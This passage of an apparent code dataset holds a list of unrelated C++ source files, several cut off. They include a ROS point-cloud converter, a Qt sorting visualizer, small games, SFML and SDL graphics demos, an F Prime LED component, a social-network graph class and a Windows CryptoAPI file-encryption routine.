std::endl;\n}\n\nint main(int argc, char **argv){\n    ros::init(argc, argv, \"pcd_conversion\");\n    ros::NodeHandle nh(\"~\");\n\n    // 0. Parameters\n    bool convert_mode_to_my_extension = true;\n    string out_path {\"\"};\n    string dir {\"\"};\n    int scan_num = 130;\n    int scan_start = 1;\n\n    nh.param<bool>(\"convert_mode_to_my_extension\", convert_mode_to_my_extension, convert_mode_to_my_extension);\n    nh.param<int>(\"scan_num\", scan_num, scan_num);\n    nh.param<int>(\"scan_start\", scan_start, scan_start);\n    nh.param<string>(\"dir\", dir, dir);\n    nh.param<string>(\"out_path\", out_path, out_path);\n\n    ros::Time start = ros::Time::now();\n    // 1. npy4 to XYZL pcd\n    for(int file_id = scan_start; file_id <= scan_num; file_id++){\n        if(convert_mode_to_my_extension)\n            convert_npyClass_pcdXYZVector(dir + \"merged\" + to_string(file_id) + \".npy\", out_path + \"merged\" + to_string(file_id) + \".pcd\");\n        else\n            convert_npyClass_pcdXYZL(dir + \"merged\" + to_string(file_id) + \".npy\", out_path + \"xyzl\" + to_string(file_id) + \".pcd\");\n    }\n\n    ros::Time end = ros::Time::now();\n    ROS_INFO_STREAM(\"Vector Practice finished in \" << (end - start).toSec() << \"s\");\n    ros::spin();\n    return 0;\n}",
    "//\n// Created by Alex Balta on 03.07.2024.\n//\n\n#include \"MenuWindow.hpp\"\n\nMenuWindow::MenuWindow(QGraphicsScene *scene, QGraphicsView *view, QWidget *parent)\n    : QWidget(parent),\n      m_parent(parent),\n      m_scene(scene),\n      m_view(view),\n      playing(false),\n      m_link(nullptr),\n      m_sort(nullptr) {\n\n    m_chooseAlgorithm = new QComboBox(this);\n    m_chooseAlgorithm->addItems({\n                                    \"Bubble Sort\", \"Quick Sort\", \"Merge Sort\", \"Radix Sort\",\n                                    \"Bucket Sort\", \"Insertion Sort\", \"Heap Sort\", \"Selection Sort\",\n                                    \"Sorting Networks\", \"Stupid Sorts\"\n                                });\n\n    m_chooseOption = new QComboBox(this);\n    m_optionManager = new OptionManager(m_chooseOption);\n    connect(m_chooseAlgorithm, SIGNAL(currentIndexChanged(int)), m_optionManager, SLOT(updateOptions(int)));\n    m_chooseAlgorithm->setCurrentIndex(1);\n    m_chooseAlgorithm->setCurrentIndex(0); // To force a refresh\n\n    auto delayLayout = new QHBoxLayout;\n    m_chooseDelay = new QSlider(Qt::Horizontal);\n    m_chooseDelay->setRange(0, 9);\n    m_textDelay = new QLabel(\"0 ms\");\n    connect(m_chooseDelay, &QSlider::valueChanged, [this]() {\n        m_textDelay->setText(QString::number(m_chooseDelay->value()) + \" ms\");\n    });\n    delayLayout->addWidget(m_chooseDelay);\n    delayLayout->addWidget(m_textDelay);\n\n    m_chooseDistribution = new QComboBox(this);\n    m_chooseDistribution->addItems({\"Regular\", \"Uniform\", \"Centered\", \"Split\", \"High\", \"Low\"});\n\n    m_chooseScramble = new QComboBox(this);\n    m_chooseScramble->addItems({\"Random\", \"Sorted-ish\", \"Reversed-ish\", \"Shuffle\"});\n\n    m_chooseSize = new QComboBox(this);\n    m_chooseSize->addItems({\"8\", \"16\", \"32\", \"64\", \"128\", \"256\", \"512\", \"1024\"});\n    m_chooseSize->setCurrentIndex(4);\n//    connect(m_chooseSize, SIGNAL(currentIndexChanged(int)), this, SLOT(Resize(int)));\n\n    m_numberCompare = new QLCDNumber(this);\n    m_numberCompare->setDigitCount(10);\n    m_numberRead = new QLCDNumber(this);\n    m_numberRead->setDigitCount(10);\n    m_numberWrite = new QLCDNumber(this);\n    m_numberWrite->setDigitCount(10);\n\n    m_buttonStart = new QPushButton(\"Start\", this);\n    m_buttonPause = new QPushButton(\"--\", this);\n    m_buttonPause->setEnabled(false);\n\n    m_layout = new QVBoxLayout(this);\n    m_layout->addWidget(new QLabel(\"Algorithm:\", this));\n    m_layout->addWidget(m_chooseAlgorithm);\n    m_layout->addWidget(new QLabel(\"Specification:\", this));\n    m_layout->addWidget(m_chooseOption);\n    m_layout->addWidget(new QLabel(\"Delay:\", this));\n    m_layout->addLayout(delayLayout);\n    m_layout->addWidget(new QLabel(\"Size:\", this));\n    m_layout->addWidget(m_chooseSize);\n    m_layout->addWidget(new QLabel(\"Distribution:\", this));\n    m_layout->addWidget(m_chooseDistribution);\n    m_layout->addWidget(new QLabel(\"Scramble:\", this));\n    m_layout->addWidget(m_chooseScramble);\n    m_layout->addWidget(new QLabel(\"Comparisons\", this));\n    m_layout->addWidget(m_numberCompare);\n    m_layout->addWidget(new QLabel(\"Accesses (read)\", this));\n    m_layout->addWidget(m_numberRead);\n    m_layout->addWidget(new QLabel(\"Accesses (write)\", this));\n    m_layout->addWidget(m_numberWrite);\n\n    m_layout->addWidget(m_buttonStart);\n    m_layout->addWidget(m_buttonPause);\n\n    connect(m_buttonStart, SIGNAL(clicked()), this, SLOT(run()));\n}\n\nvoid MenuWindow::run() {\n    m_buttonStart->setText(\"Abort\");\n    disconnect(m_buttonStart, SIGNAL(clicked()), this, SLOT(run()));\n    connect(m_buttonStart, SIGNAL(clicked()), this, SLOT(abort()));\n    connect(m_buttonPause, SIGNAL(clicked()), this, SLOT(pause()));\n    m_buttonPause->setText(\"Pause\");\n    m_buttonPause->setEnabled(true);\n    int size = (1 << (m_chooseSize->currentIndex() + 3));\n\n    m_array.resize(size);\n    Distributor distributor(m_array);\n\n    m_chooseAlgorithm->setEnabled(false);\n    m_chooseOption->setEnabled(false);\n    m_chooseDelay->setEnabled(false);\n    m_chooseSize->setEnabled(false);\n    m_chooseDistribution->setEnabled(false);\n    m_chooseScramble->setEnabled(false);\n\n    switch (m_chooseDistribution->currentIndex()) {\n        case 0: distributor.DRegular();\n            break;\n        case 1: distributor.DUniform();\n            break;\n        case 2: distributor.DCentered();\n            break;\n        case 3: distributor.DSplit();\n            break;\n        case 4: distributor.DHigh();\n            break;\n        case 5: distributor.DLow();\n            break;\n    }\n    switch (m_chooseScramble->currentIndex()) {\n        case 0: distributor.SRandom();\n            break;\n        case 1: distributor.SSorted();\n            break;\n        case 2: distributor.SReversed();\n            break;\n        case 3: distributor.SShuffle();\n            break;\n    }\n    int delay = m_chooseDelay->value() * 1000;\n\n    m_link = new Linker(this, m_array, size, m_scene, delay);\n    m_sort = new Sorter(m_link);\n\n    switch (m_chooseAlgorithm->currentIndex()) {\n     ",
    "#include <iostream> // Biblioteca para entrada e sa\u00edda de dados em C++\r\n\r\n// Fun\u00e7\u00e3o para adicionar produtos ao estoque\r\nvoid adicionarProduto(std::string produtos[], int quantidades[], int tamanho, std::string produto, int quantidade)\r\n{\r\n    produtos[tamanho] = produto;       // Adiciona o produto ao final do array de produtos\r\n    quantidades[tamanho] = quantidade; // Adiciona a quantidade correspondente ao produto\r\n}\r\n\r\n// Fun\u00e7\u00e3o para remover produtos vendidos do estoque\r\nvoid removerProduto(std::string produtos[], int quantidades[], int tamanho, std::string produto, int quantidade)\r\n{\r\n    for (int i = 0; i < tamanho; i++) // Loop para percorrer o array de produtos\r\n    {\r\n        if (produtos[i] == produto) // Verifica se o produto est\u00e1 no estoque\r\n        {\r\n            quantidades[i] -= quantidade; // Remove a quantidade vendida do estoque\r\n            if (quantidades[i] <= 0)      // Se a quantidade no estoque for menor ou igual a zero\r\n            {\r\n                for (int j = i; j < tamanho - 1; j++) // Loop para ajustar o array ap\u00f3s a remo\u00e7\u00e3o do produto\r\n                {\r\n                    produtos[j] = produtos[j + 1];       // Move os produtos restantes uma posi\u00e7\u00e3o para tr\u00e1s\r\n                    quantidades[j] = quantidades[j + 1]; // Move as quantidades restantes uma posi\u00e7\u00e3o para tr\u00e1s\r\n                }\r\n                tamanho--; // Reduz o tamanho do estoque\r\n            }\r\n            std::cout << \"Produto '\" << produto << \"' removido do estoque.\\n\"; // Exibe mensagem de remo\u00e7\u00e3o\r\n            break;                                                             // Sai do loop ap\u00f3s encontrar e remover o produto\r\n        }\r\n    }\r\n}\r\n\r\n// Fun\u00e7\u00e3o para exibir o estoque atual\r\nvoid exibirEstoque(std::string produtos[], int quantidades[], int tamanho)\r\n{\r\n    std::cout << \"Estoque atual:\\n\";  // Exibe cabe\u00e7alho\r\n    for (int i = 0; i < tamanho; i++) // Loop para percorrer o estoque\r\n    {\r\n        std::cout << produtos[i] << \": \" << quantidades[i] << \" unidades\\n\"; // Exibe cada produto e sua quantidade no estoque\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    const int maxProdutos = 100;       // Define o tamanho m\u00e1ximo do array de produtos\r\n    std::string produtos[maxProdutos]; // Array para armazenar os produtos\r\n    int quantidades[maxProdutos];      // Array para armazenar as quantidades dispon\u00edveis\r\n    int tamanho = 0;                   // Vari\u00e1vel para controlar o tamanho atual dos arrays\r\n\r\n    // Adiciona produtos inicialmente ao estoque\r\n    adicionarProduto(produtos, quantidades, tamanho, \"Ma\u00e7\u00e3s\", 50);\r\n    tamanho++;\r\n    adicionarProduto(produtos, quantidades, tamanho, \"P\u00e3es\", 100);\r\n    tamanho++;\r\n    adicionarProduto(produtos, quantidades, tamanho, \"Leite\", 30);\r\n    tamanho++;\r\n\r\n    // Exibe o estoque inicial\r\n    exibirEstoque(produtos, quantidades, tamanho);\r\n\r\n    // Simula algumas vendas\r\n    removerProduto(produtos, quantidades, tamanho, \"Ma\u00e7\u00e3s\", 5);\r\n    removerProduto(produtos, quantidades, tamanho, \"P\u00e3es\", 5);\r\n    removerProduto(produtos, quantidades, tamanho, \"Leite\", 5);\r\n\r\n    // Exibe o estoque ap\u00f3s as vendas\r\n    exibirEstoque(produtos, quantidades, tamanho);\r\n\r\n    return 0;\r\n}",
    "// ======================================================================\n// \\title  Led.cpp\n// \\author tcanham\n// \\brief  cpp file for Led component implementation class\n// ======================================================================\n\n#include \"Components/Led/Led.hpp\"\n#include \"FpConfig.hpp\"\n\nnamespace Components {\n\n// ----------------------------------------------------------------------\n// Component construction and destruction\n// ----------------------------------------------------------------------\n\nLed::Led(const char* const compName)\n    : LedComponentBase(compName), state(Fw::On::OFF), transitions(0), count(0), blinking(false) {}\n\nLed ::~Led() {}\n\n// ----------------------------------------------------------------------\n// Handler implementations for commands\n// ----------------------------------------------------------------------\n\nvoid Led::BLINKING_ON_OFF_cmdHandler(const FwOpcodeType opCode, const U32 cmdSeq, Fw::On on_off) {\n    // Create a variable to represent the command response\n    auto cmdResp = Fw::CmdResponse::OK;\n\n    // Verify if on_off is a valid argument.\n    // Note: isValid is an autogenerate helper function for enums defined in fpp.\n    if (!on_off.isValid()) {\n        this->log_WARNING_LO_InvalidBlinkArgument(on_off);\n        // Update command response with a validation error\n        cmdResp = Fw::CmdResponse::VALIDATION_ERROR;\n    } else {\n        this->count = 0;  // Reset count on any successful command\n        this->lock.lock();\n        this->blinking = Fw::On::ON == on_off;  // Update blinking state\n        this->lock.unlock();\n\n        this->log_ACTIVITY_HI_SetBlinkingState(on_off);\n        this->tlmWrite_BlinkingState(on_off);\n    }\n\n    // Provide command response\n    this->cmdResponse_out(opCode, cmdSeq, cmdResp);\n}\n\nvoid Led::parameterUpdated(FwPrmIdType id) {\n    // Read back the parameter value\n    Fw::ParamValid isValid;\n    U32 interval = this->paramGet_BLINK_INTERVAL(isValid);\n    // NOTE: isValid is always VALID in parameterUpdated as it was just properly set\n    FW_ASSERT(isValid == Fw::ParamValid::VALID, isValid);\n\n    // Check the parameter ID is expected\n    if (PARAMID_BLINK_INTERVAL == id) {\n        this->log_ACTIVITY_HI_BlinkIntervalSet(interval);\n    }\n}\n\nvoid Led ::run_handler(const NATIVE_INT_TYPE portNum, NATIVE_UINT_TYPE context) {\n    // Read back the parameter value\n    Fw::ParamValid isValid;\n    U32 interval = this->paramGet_BLINK_INTERVAL(isValid);\n\n    // Force interval to be 0 when invalid or not set\n    interval = ((Fw::ParamValid::INVALID == isValid) || (Fw::ParamValid::UNINIT == isValid)) ? 0 : interval;\n\n    // Only perform actions when set to blinking\n    this->lock.lock();\n    bool is_blinking = this->blinking;\n    this->lock.unlock();\n    if (is_blinking) {\n        Fw::On new_state = this->state;\n        // Check for transitions\n        if ((0 == this->count) && (this->state == Fw::On::OFF)) {\n            new_state = Fw::On::ON;\n        } else if (((interval / 2) == this->count) && (this->state == Fw::On::ON)) {\n            new_state = Fw::On::OFF;\n        }\n\n        // A transition has occurred\n        if (this->state != new_state) {\n            this->transitions = this->transitions + 1;\n            this->tlmWrite_LedTransitions(this->transitions);\n\n            // Port may not be connected, so check before sending output\n            if (this->isConnected_gpioSet_OutputPort(0)) {\n                this->gpioSet_out(0, (Fw::On::ON == new_state) ? Fw::Logic::HIGH : Fw::Logic::LOW);\n            }\n\n            this->log_ACTIVITY_HI_SetBlinkingState(new_state);\n            this->state = new_state;\n        }\n\n        this->count = ((this->count + 1) >= interval) ? 0 : (this->count + 1);\n    } else {\n        if (this->state == Fw::On::ON) {\n            // Port may not be connected, so check before sending output\n            if (this->isConnected_gpioSet_OutputPort(0)) {\n                this->gpioSet_out(0, Fw::Logic::LOW);\n            }\n\n            this->state = Fw::On::OFF;\n            // TODO: Add an event to report the LED state (this->state).\n        }\n    }\n}\n}  // namespace Components\n",
    "//\n// Created by Zach Nelson on 8/1/24.\n//\n\n#include \"Application.h\"\n#include \"SDL.h\"\n\n#include \"debug/FPSOverlay.h\"\n#include \"debug/RendererInfo.h\"\n\nnamespace app\n{\nnamespace\n{\nconstexpr int kWindowWidth = 1280;\nconstexpr int kWindowHeight = 720;\n\n}    // anonymous namespace\n\nApplication::Application()\n{\n\tSDL_Init(SDL_INIT_VIDEO);\n\n\tmWindow = SDL_CreateWindow(\"lightfoot\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, kWindowWidth, kWindowHeight,\n\t\t\t\t\t\t\t   SDL_WINDOW_SHOWN | SDL_WINDOW_ALLOW_HIGHDPI);\n\n\tmRenderer = SDL_CreateRenderer(mWindow, -1, SDL_RENDERER_ACCELERATED | SDL_RENDERER_PRESENTVSYNC);\n\n#ifndef NDEBUG\n\tconst debug::RendererInfo rendererInfo{mRenderer};\n\trendererInfo.Print();\n#endif\n}\n\nApplication::~Application()\n{\n\tif (mWindow)\n\t{\n\t\tSDL_DestroyWindow(mWindow);\n\t}\n\n\tSDL_Quit();\n}\n\nint Application::Run()\n{\n#ifndef NDEBUG\n\tSDL_Color fpsColor = FC_MakeColor(255, 108, 0, 255);\n\tdebug::ui::FPSOverlay fps{std::move(fpsColor), mRenderer};\n#endif\n\n\tbool alive = true;\n\twhile (alive)\n\t{\n\t\tSDL_Event event;\n\t\twhile (SDL_PollEvent(&event) > 0)\n\t\t{\n\t\t\tswitch (event.type)\n\t\t\t{\n\t\t\t\tcase SDL_QUIT:\n\t\t\t\t{\n\t\t\t\t\talive = false;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tSDL_SetRenderDrawColor(mRenderer, 10, 20, 30, 255);\n\t\tSDL_RenderClear(mRenderer);\n\n\t\tfps.Update();\n\t\tfps.Draw(mRenderer);\n\n\t\tSDL_RenderPresent(mRenderer);\n\t}\n\n\treturn 0;\n}\n\n}    // namespace app\n",
    "#include<sstream>\n#include<istream>\n#include<cstring>\n#include<iostream>\n#include<cstdio>\n#include<vector>\n#include<objbase.h>\n#include <wincrypt.h>\n#include <conio.h>\n#include <tchar.h>\n#pragma comment (lib, \"advapi32\")\n\n#define KEYLENGTH  0x00800000\n#define ENCRYPT_ALGORITHM CALG_RC4 \n#define ENCRYPT_BLOCK_SIZE 8 \nusing namespace std;\nvoid StringSplit(std::string str, const char split, std::vector<std::string>& rst)\n{\n\tstd::istringstream iss(str);\t// \u8f93\u5165\u6d41\n\tstd::string token;\t\t\t// \u63a5\u6536\u7f13\u51b2\u533a\n\twhile (std::getline(iss, token, split))\t// \u4ee5split\u4e3a\u5206\u9694\u7b26\n\t{\n\t\trst.push_back(token);\n\t}\n}\nint GetCharNumberOfString(std::string s, std::string c) {\n    int index = 0;\n    int sum = 0;\n    while ((index = s.find(c, index)) != string::npos) {\n        index += c.length();\n        sum++;\n    }\n    return sum;\n}\nchar buf[64] = { 0 };\nchar* GuidToString(const GUID guid)\n{\n\tsnprintf(buf, sizeof(buf),\n\t\t\"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\",\n\t\tguid.Data1, guid.Data2, guid.Data3,\n\t\tguid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],\n\t\tguid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);\n\treturn buf;\n}\nvoid MyHandleError(const char* psz, int nErrorNumber)\n{\n    printf( \"An error occurred in the encryption process. \\n\");\n    printf( \"%s\\n\", psz);\n    printf( \"Error number %x.\\n\", nErrorNumber);\n}\nbool EncryptFileWithMS(\n    char* pszSourceFile,\n    char* pszDestinationFile,\n    char* pszPassword)\n{\n    //---------------------------------------------------------------\n    // Declare and initialize local variables.\n    bool fReturn = false;\n    HANDLE hSourceFile = INVALID_HANDLE_VALUE;\n    HANDLE hDestinationFile = INVALID_HANDLE_VALUE;\n\n    HCRYPTPROV hCryptProv = NULL;\n    HCRYPTKEY hKey = NULL;\n    HCRYPTKEY hXchgKey = NULL;\n    HCRYPTHASH hHash = NULL;\n\n    PBYTE pbKeyBlob = NULL;\n    DWORD dwKeyBlobLen;\n\n    PBYTE pbBuffer = NULL;\n    DWORD dwBlockLen;\n    DWORD dwBufferLen;\n    DWORD dwCount;\n    bool fEOF = FALSE;\n\n\n    //---------------------------------------------------------------\n    // Open the source file. \n    hSourceFile = CreateFileA(\n        pszSourceFile,\n        FILE_READ_DATA,\n        FILE_SHARE_READ,\n        NULL,\n        OPEN_EXISTING,\n        FILE_ATTRIBUTE_NORMAL,\n        NULL);\n    if (INVALID_HANDLE_VALUE != hSourceFile)\n    {\n        printf(\"The source plaintext file, %s, is open. \\n\",pszSourceFile);\n    }\n    else\n    {\n        MyHandleError(\n            \"Error opening source plaintext file!\\n\",\n            GetLastError());\n        goto Exit_MyEncryptFile;\n    }\n\n    //---------------------------------------------------------------\n    // Open the destination file. \n    hDestinationFile = CreateFileA(\n        pszDestinationFile,\n        FILE_WRITE_DATA,\n        FILE_SHARE_READ,\n        NULL,\n        OPEN_ALWAYS,\n        FILE_ATTRIBUTE_NORMAL,\n        NULL);\n    if (INVALID_HANDLE_VALUE != hDestinationFile)\n    {\n        printf(\n            \"The destination file, %s, is open. \\n\",\n            pszDestinationFile);\n    }\n    else\n    {\n        MyHandleError(\n           \"Error opening destination file!\\n\",\n            GetLastError());\n        goto Exit_MyEncryptFile;\n    }\n\n    //---------------------------------------------------------------\n    // Get the handle to the default provider. \n    if (CryptAcquireContext(\n        &hCryptProv,\n        NULL,\n        MS_ENHANCED_PROV,\n        PROV_RSA_FULL,\n        0))\n    {\n        printf(\n            \"A cryptographic provider has been acquired. \\n\");\n    }\n    else\n    {\n        MyHandleError(\n            \"Error during CryptAcquireContext!\\n\",\n            GetLastError());\n        goto Exit_MyEncryptFile;\n    }\n\n    //---------------------------------------------------------------\n    // Create the session key.\n    if (!pszPassword || !pszPassword[0])\n    {\n        //-----------------------------------------------------------\n        // No password was passed.\n        // Encrypt the file with a random session key, and write the \n        // key to a file. \n\n        //-----------------------------------------------------------\n        // Create a random session key. \n        if (CryptGenKey(\n            hCryptProv,\n            ENCRYPT_ALGORITHM,\n            KEYLENGTH | CRYPT_EXPORTABLE,\n            &hKey))\n        {\n            printf(\"A session key has been created. \\n\");\n        }\n        else\n        {\n            MyHandleError(\n                \"Error during CryptGenKey. \\n\",\n                GetLastError());\n            goto Exit_MyEncryptFile;\n        }\n\n        //-----------------------------------------------------------\n        // Get the handle to the exchange public key. \n        if (CryptGetUserKey(\n            hCryptProv,\n            AT_KEYEXCHANGE,\n            &hXchgKey))\n        {\n            printf(\n                \"The user public key has been retrieved. \\n\");\n        }\n        else\n        {\n            if (NTE_NO_KEY == GetLastError())\n            {\n                // No exchange key exists. Try to create one.\n               ",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include \"Effect.hpp\"\n#include <vector>\n#include <cmath>\n\n\nconst sf::Font* Effect::s_font = NULL;\n\n////////////////////////////////////////////////////////////\n// \"Pixelate\" fragment shader\n////////////////////////////////////////////////////////////\nclass Pixelate : public Effect\n{\npublic:\n\n    Pixelate() :\n    Effect(\"Pixelate\")\n    {\n    }\n\n    bool onLoad()\n    {\n        // Load the texture and initialize the sprite\n        if (!m_texture.loadFromFile(\"resources/background.jpg\"))\n            return false;\n        m_sprite.setTexture(m_texture);\n\n        // Load the shader\n        if (!m_shader.loadFromFile(\"resources/pixelate.frag\", sf::Shader::Fragment))\n            return false;\n        m_shader.setUniform(\"texture\", sf::Shader::CurrentTexture);\n\n        return true;\n    }\n\n    void onUpdate(float, float x, float y)\n    {\n        m_shader.setUniform(\"pixel_threshold\", (x + y) / 30);\n    }\n\n    void onDraw(sf::RenderTarget& target, sf::RenderStates states) const\n    {\n        states.shader = &m_shader;\n        target.draw(m_sprite, states);\n    }\n\nprivate:\n\n    sf::Texture m_texture;\n    sf::Sprite m_sprite;\n    sf::Shader m_shader;\n};\n\n\n////////////////////////////////////////////////////////////\n// \"Wave\" vertex shader + \"blur\" fragment shader\n////////////////////////////////////////////////////////////\nclass WaveBlur : public Effect\n{\npublic:\n\n    WaveBlur() :\n    Effect(\"Wave + Blur\")\n    {\n    }\n\n    bool onLoad()\n    {\n        // Create the text\n        m_text.setString(\"Praesent suscipit augue in velit pulvinar hendrerit varius purus aliquam.\\n\"\n                         \"Mauris mi odio, bibendum quis fringilla a, laoreet vel orci. Proin vitae vulputate tortor.\\n\"\n                         \"Praesent cursus ultrices justo, ut feugiat ante vehicula quis.\\n\"\n                         \"Donec fringilla scelerisque mauris et viverra.\\n\"\n                         \"Maecenas adipiscing ornare scelerisque. Nullam at libero elit.\\n\"\n                         \"Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas.\\n\"\n                         \"Nullam leo urna, tincidunt id semper eget, ultricies sed mi.\\n\"\n                         \"Morbi mauris massa, commodo id dignissim vel, lobortis et elit.\\n\"\n                         \"Fusce vel libero sed neque scelerisque venenatis.\\n\"\n                         \"Integer mattis tincidunt quam vitae iaculis.\\n\"\n                         \"Vivamus fringilla sem non velit venenatis fermentum.\\n\"\n                         \"Vivamus varius tincidunt nisi id vehicula.\\n\"\n                         \"Integer ullamcorper, enim vitae euismod rutrum, massa nisl semper ipsum,\\n\"\n                         \"vestibulum sodales sem ante in massa.\\n\"\n                         \"Vestibulum in augue non felis convallis viverra.\\n\"\n                         \"Mauris ultricies dolor sed massa convallis sed aliquet augue fringilla.\\n\"\n                         \"Duis erat eros, porta in accumsan in, blandit quis sem.\\n\"\n                         \"In hac habitasse platea dictumst. Etiam fringilla est id odio dapibus sit amet semper dui laoreet.\\n\");\n        m_text.setFont(getFont());\n        m_text.setCharacterSize(22);\n        m_text.setPosition(30, 20);\n\n        // Load the shader\n        if (!m_shader.loadFromFile(\"resources/wave.vert\", \"resources/blur.frag\"))\n            return false;\n\n        return true;\n    }\n\n    void onUpdate(float time, float x, float y)\n    {\n        m_shader.setUniform(\"wave_phase\", time);\n        m_shader.setUniform(\"wave_amplitude\", sf::Vector2f(x * 40, y * 40));\n        m_shader.setUniform(\"blur_radius\", (x + y) * 0.008f);\n    }\n\n    void onDraw(sf::RenderTarget& target, sf::RenderStates states) const\n    {\n        states.shader = &m_shader;\n        target.draw(m_text, states);\n    }\n\nprivate:\n\n    sf::Text m_text;\n    sf::Shader m_shader;\n};\n\n\n////////////////////////////////////////////////////////////\n// \"Storm\" vertex shader + \"blink\" fragment shader\n////////////////////////////////////////////////////////////\nclass StormBlink : public Effect\n{\npublic:\n\n    StormBlink() :\n    Effect(\"Storm + Blink\")\n    {\n    }\n\n    bool onLoad()\n    {\n        // Create the points\n        m_points.setPrimitiveType(sf::Points);\n        for (int i = 0; i < 40000; ++i)\n        {\n            float x = static_cast<float>(std::rand() % 800);\n            float y = static_cast<float>(std::rand() % 600);\n            sf::Uint8 r = static_cast<sf::Uint8>(std::rand() % 255);\n            sf::Uint8 g = static_cast<sf::Uint8>(std::rand() % 255);\n            sf::Uint8 b = static_cast<sf::Uint8>(std::rand() % 255);\n            m_points.append(sf::Vertex(sf::Vector2f(x, y), sf::Color(r, g, b)));\n        }\n\n        // Load the shader\n        if (!m_shader.loadFromFile(\"resources/storm.vert\", \"resources/blink.frag\"))\n            return false;\n",
    "\n#include <iostream>\n#include <vector>\nusing namespace std;\nconst int SIZE = 3;\nvoid drawbaord(vector<vector<char>> board){\n    cout << \"---------------\\n\"; \n    for(int i = 0 ; i < SIZE; i++){\n        for(int j = 0 ; j < SIZE; j++){\n            cout << \" | \" << board.at(i).at(j);\n            if(j == 2){\n                cout << \" |\\n\";\n            }\n        }\n        cout << \"---------------\\n\";\n    }\n}\n\nbool checkifwin(vector<vector<char>> board, char player){\n    for(int i = 0 ; i< SIZE; i++){\n        if(board.at(0).at(i) == player && board.at(1).at(i) == player && board.at(2).at(i) == player){\n            return true;\n        }\n        if(board.at(i).at(0) == player && board.at(i).at(1) == player && board.at(i).at(2) == player){\n            return true;\n        }\n    }\n    if(board.at(0).at(0) == player && board.at(1).at(1) == player && board.at(2).at(2) == player){\n            return true;\n        }\n    if(board.at(2).at(0) == player && board.at(1).at(1) == player && board.at(0).at(2) == player){\n            return true;\n        }\n    return false;\n}\n\nint main(){\n    vector<vector<char>> board = vector<vector<char>>(SIZE,vector<char>(SIZE, ' '));\n    cout << \"Welcome to Tic-Tac-Toe!\\n\";\n    drawbaord(board);\n    bool win = false;\n    int tors = 0;\n    char player = 'X';\n    int row, col;\n    while(!win && (tors < 9)){\n        player = ((tors % 2 == 0)? 'X' : 'O');\n        cout << \"Player \"<< player << \", enter row (0-2) and column (0-2):\"; \n        while(true){\n            cin >> row >> col;\n            if((row < 0 || row > 2 || col < 0 || col > 2) || board.at(row).at(col) != ' ' ){\n                cout << \"Invalid move! try again:\";\n            }\n            else break;\n        }\n        board.at(row).at(col) = player;\n        win = checkifwin(board,player);\n        if(win){\n            cout << \"Player \" << player << \" win!\\n\";\n        }\n        drawbaord(board);\n        tors++;\n    }\n\n    return 0;\n}",
    "#include <iostream>\n\n#include <Graphics.hpp>\n#include <System.hpp>\n#include <Window.hpp>\n#include <Audio.hpp>\n#include <Network.hpp>\n\n\nint main()\n{\n    sf::RenderWindow window(sf::VideoMode(1920, 1080), \"SFML Works!\", sf::Style::Default);\n    window.setFramerateLimit(120);\n\n    sf::Clock clock;\n    float deltaTime;\n    // 0.0082\n    float multiplier = 122.f;\n\n    sf::RectangleShape shape;\n    shape.setFillColor(sf::Color::White);\n    shape.setSize(sf::Vector2f(100.f, 100.f));\n\n    while(window.isOpen())\n    {\n        sf::Event event;\n        while(window.pollEvent(event))\n        {\n            if(event.type == sf::Event::Closed)\n                window.close();\n\n            if(event.KeyPressed && event.key.code == sf::Keyboard::Escape)\n                window.close();\n        }\n\n        deltaTime = clock.restart().asSeconds();\n\n        // Update\n        if(sf::Keyboard::isKeyPressed(sf::Keyboard::A))\n            shape.move(-5.f * deltaTime * multiplier, 0.f);\n        if(sf::Keyboard::isKeyPressed(sf::Keyboard::D))\n            shape.move(5.f * deltaTime * multiplier, 0.f);\n        if(sf::Keyboard::isKeyPressed(sf::Keyboard::W))\n            shape.move(0.f, -5.f * deltaTime * multiplier);\n        if(sf::Keyboard::isKeyPressed(sf::Keyboard::S))\n            shape.move(0.f, 5.f * deltaTime * multiplier);\n\n        // Draw\n        window.clear();\n        // Draw stuff\n        window.draw(shape);\n\n        window.display();\n\n        std::cout << \"Delta time: \" << deltaTime << std::endl;\n    }\n\n    return 0;\n}\n\n",
    "#include <iostream>\r\n#include <unordered_map>\r\n#include <unordered_set>\r\n#include <string>\r\n#include <queue>\r\n#include <vector>\r\n#include <algorithm>\r\n#include <sstream>\r\n#include <fstream>\r\n#include <limits>\r\n#include <set>\r\n#include <map>\r\n\r\nusing namespace std;\r\n\r\nclass SocialNetworkGraph {\r\nprivate:\r\n    struct User {\r\n        unordered_map<string, int> connections; // Connection with weights\r\n        bool isPrivate = false; // Privacy setting\r\n        vector<string> groups; // Groups user is part of\r\n    };\r\n\r\n    unordered_map<string, User> adjacencyList;\r\n\r\npublic:\r\n    void addUser(const string& user, bool isPrivate = false) {\r\n        if (adjacencyList.find(user) == adjacencyList.end()) {\r\n            adjacencyList[user] = User{unordered_map<string, int>(), isPrivate};\r\n            cout << \"User \" << user << \" added.\\n\";\r\n        } else {\r\n            cout << \"User \" << user << \" already exists.\\n\";\r\n        }\r\n    }\r\n\r\n    void removeUser(const string& user) {\r\n        if (adjacencyList.find(user) != adjacencyList.end()) {\r\n            adjacencyList.erase(user);\r\n            for (auto& pair : adjacencyList) {\r\n                pair.second.connections.erase(user);\r\n            }\r\n            cout << \"User \" << user << \" removed.\\n\";\r\n        } else {\r\n            cout << \"User \" << user << \" does not exist.\\n\";\r\n        }\r\n    }\r\n\r\n    void addConnection(const string& user1, const string& user2, int weight = 1) {\r\n        if (adjacencyList.find(user1) != adjacencyList.end() && adjacencyList.find(user2) != adjacencyList.end()) {\r\n            adjacencyList[user1].connections[user2] = weight;\r\n            adjacencyList[user2].connections[user1] = weight;\r\n            cout << \"Connection added between \" << user1 << \" and \" << user2 << \" with weight \" << weight << \".\\n\";\r\n        } else {\r\n            cout << \"One or both users do not exist.\\n\";\r\n        }\r\n    }\r\n\r\n    void removeConnection(const string& user1, const string& user2) {\r\n        if (adjacencyList.find(user1) != adjacencyList.end() && adjacencyList.find(user2) != adjacencyList.end()) {\r\n            adjacencyList[user1].connections.erase(user2);\r\n            adjacencyList[user2].connections.erase(user1);\r\n            cout << \"Connection 